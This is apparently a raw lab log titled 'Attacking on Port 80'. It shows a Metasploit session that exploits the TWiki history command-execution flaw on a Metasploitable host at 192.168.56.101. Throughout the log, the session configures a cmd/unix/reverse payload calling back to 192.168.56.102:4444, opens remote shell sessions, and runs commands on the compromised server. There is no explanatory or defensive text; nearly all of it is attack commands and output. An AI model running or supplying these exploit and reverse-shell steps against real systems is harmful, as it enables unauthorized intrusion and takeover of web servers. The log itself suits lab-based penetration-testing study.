# Attacking on Port 80

```
msf > search twiki
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                    Disclosure Date  Rank       Description
   ----                                    ---------------  ----       -----------
   exploit/unix/http/twiki_debug_plugins   2014-10-09       excellent  TWiki Debugenableplugins Remote Code Execution
   exploit/unix/webapp/moinmoin_twikidraw  2012-12-30       manual     MoinMoin twikidraw Action Traversal File Upload
   exploit/unix/webapp/twiki_history       2005-09-14       excellent  TWiki History TWikiUsers rev Parameter Command Execution
   exploit/unix/webapp/twiki_maketext      2012-12-15       excellent  TWiki MAKETEXT Remote Command Execution
   exploit/unix/webapp/twiki_search        2004-10-01       excellent  TWiki Search Function Arbitrary Command Execution


msf > use exploit/unix/webapp/twiki_history
msf exploit(twiki_history) > show options

Module options (exploit/unix/webapp/twiki_history):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /twiki/bin       yes       TWiki bin directory path
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(twiki_history) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(twiki_history) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(twiki_history) > show options

Module options (exploit/unix/webapp/twiki_history):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST    192.168.56.101   yes       The target address
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /twiki/bin       yes       TWiki bin directory path
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(twiki_history) > set LHOST 192.168.56.102
LHOST => 192.168.56.102
msf exploit(twiki_history) > show options

Module options (exploit/unix/webapp/twiki_history):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST    192.168.56.101   yes       The target address
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /twiki/bin       yes       TWiki bin directory path
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.102   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



msf exploit(twiki_history) > run

[*] Started reverse TCP double handler on 192.168.56.102:4444 
[-] Exploit failed [unreachable]: Rex::HostUnreachable The host (192.168.68.101:80) was unreachable.
[*] Exploit completed, but no session was created.
msf exploit(twiki_history) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(twiki_history) > exploit

[*] Started reverse TCP double handler on 192.168.56.102:4444 
[+] Successfully sent exploit request
[*] Exploit completed, but no session was created.
msf exploit(twiki_history) > clear
[*] exec: clear


msf exploit(twiki_history) > show optionsa
[-] Invalid parameter "optionsa", use "show -h" for more information
msf exploit(twiki_history) > show options

Module options (exploit/unix/webapp/twiki_history):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST    192.168.56.101   yes       The target address
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /twiki/bin       yes       TWiki bin directory path
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.102   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(twiki_history) > run

[*] Started reverse TCP double handler on 192.168.56.102:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Successfully sent exploit request
[*] Command: echo MgonqNUymZBQTbP8;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Command: echo GtUuGG9YU9feCqN6;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "MgonqNUymZBQTbP8\r\n"
[*] Matching...
[*] A is input...
[*] Reading from socket B
[*] B: "GtUuGG9YU9feCqN6\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.101:57493) at 2018-05-22 05:58:11 +0000
[*] Command shell session 2 opened (192.168.56.102:4444 -> 192.168.56.101:57495) at 2018-05-22 05:58:11 +0000

pwd
/var/www/twiki/bin
ls -la
total 232
drwxr-xr-x 2 www-data www-data  4096 Feb  1  2003 .
drwxr-xr-x 7 www-data www-data  4096 Apr 16  2010 ..
-rw-r--r-- 1 www-data www-data  1598 Jun  1  2002 .htaccess.txt
-rwxr-xr-x 1 www-data www-data  4986 Jan  4  2003 attach
-rwxr-xr-x 1 www-data www-data  3734 Jan  4  2003 changes
-rwxr-xr-x 1 www-data www-data  9362 Jan  4  2003 edit
-rwxr-xr-x 1 www-data www-data  1878 Jan  4  2003 geturl
-rwxr-xr-x 1 www-data www-data  4587 Jan  4  2003 installpasswd
-rwxr-xr-x 1 www-data www-data  7231 Jan  6  2003 mailnotify
-rwxr-xr-x 1 www-data www-data  8228 Jan  4  2003 manage
-rwxr-xr-x 1 www-data www-data  2445 Jan  4  2003 oops
-rwxr-xr-x 1 www-data www-data  6936 Jan  4  2003 passwd
-rwxr-xr-x 1 www-data www-data  5820 Jan  4  2003 preview
-rwxr-xr-x 1 www-data www-data  9657 Feb  1  2003 rdiff
-rwxr-xr-x 1 www-data www-data 10584 Jan  4  2003 register
-rwxr-xr-x 1 www-data www-data 14746 Jan  5  2003 rename
-rwxr-xr-x 1 www-data www-data  4800 Jan  4  2003 save
-rwxr-xr-x 1 www-data www-data  4729 Jan  4  2003 search
-rw-r--r-- 1 www-data www-data  1415 Feb  1  2003 setlib.cfg
-rwxr-xr-x 1 www-data www-data 19266 Feb  1  2003 statistics
-rwxr-xr-x 1 www-data www-data 30626 Jan  4  2003 testenv
-rwxr-xr-x 1 www-data www-data 14313 Jan 30  2003 upload
-rwxr-xr-x 1 www-data www-data 11674 Jan 30  2003 view
-rwxr-xr-x 1 www-data www-data  2944 Jan  5  2003 viewfile
timwe
sh: line 7: timwe: command not found
time

real	0m0.000s
user	0m0.000s
sys	0m0.000s
calc
sh: line 9: calc: command not found
df
Filesystem           1K-blocks      Used Available Use% Mounted on
/dev/mapper/metasploitable-root
                       7282168   1495652   5419516  22% /
varrun                  517620       168    517452   1% /var/run
varlock                 517620         0    517620   0% /var/lock
udev                    517620        20    517600   1% /dev
devshm                  517620         0    517620   0% /dev/shm
/dev/sda1               233333     25356    195930  12% /boot
dd
back


```



